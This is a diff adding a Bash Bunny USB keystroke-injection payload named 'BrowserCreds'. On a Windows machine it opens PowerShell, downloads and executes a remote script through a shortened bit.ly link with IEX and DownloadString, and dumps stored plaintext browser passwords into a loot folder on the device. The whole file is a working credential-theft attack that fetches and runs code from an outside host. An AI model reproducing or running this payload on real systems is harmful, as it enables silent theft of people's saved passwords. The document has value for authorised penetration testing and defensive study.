@@ -1,0 +1,57 @@
+#!/bin/bash
+#
+# Title:         BrowserCreds
+# Author:        illwill
+# Version:       0.1
+#
+# Dumps the stored plaintext Browser passwords from Windows boxes downloading a Powershell script
+# then stashes them in /root/udisk/loot/BrowserCreds/%ComputerName%
+# Credits to these guys for their powershell scripts:
+# https://github.com/sekirkity/BrowserGather BrowserGather.ps1
+# https://github.com/EmpireProject/Empire    Get-FoxDump.ps1
+
+#script 
+# Blue...............Running Script
+# Purple.............Got Browser Creds
+
+
+LED R 200
+LOOTDIR=/root/udisk/loot/BrowserCreds
+
+SCRIPT="https://bit.ly/2qeXsAf"
+
+mkdir -p $LOOTDIR
+
+ATTACKMODE HID STORAGE
+LED B 200
+
+#Dump Chrome Creds
+Q DELAY 2000
+Q GUI r
+Q DELAY 500
+Q STRING "%SystemRoot%\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe"
+Q ENTER
+Q DELAY 1000
+Q STRING "\$Bunny = (gwmi win32_volume -f 'label=''BashBunny''' | Select-Object -ExpandProperty DriveLetter)"
+Q DELAY 100
+Q ENTER
+Q DELAY 1000
+Q STRING "IEX (New-Object Net.WebClient).DownloadString('$SCRIPT')"
+Q STRING " |"
+Q STRING " Export-Csv"
+Q STRING " -Append -Path"
+Q STRING " \$Bunny\\loot\\BrowserCreds\\\$env:computername"
+Q DELAY 100
+Q ENTER
+Q DELAY 100
+Q STRING exit
+Q ENTER
+Q DELAY 100
+
+sync
+LED R B 200
+
+FILE="/root/udisk/loot/BrowserCreds/DONE"
+while [ ! -e $FILE ]; do sleep 1; done;
+sleep 1;
+if [ -e $FILE ]; then rm -f $FILE; LED P 200; else LED R; fi
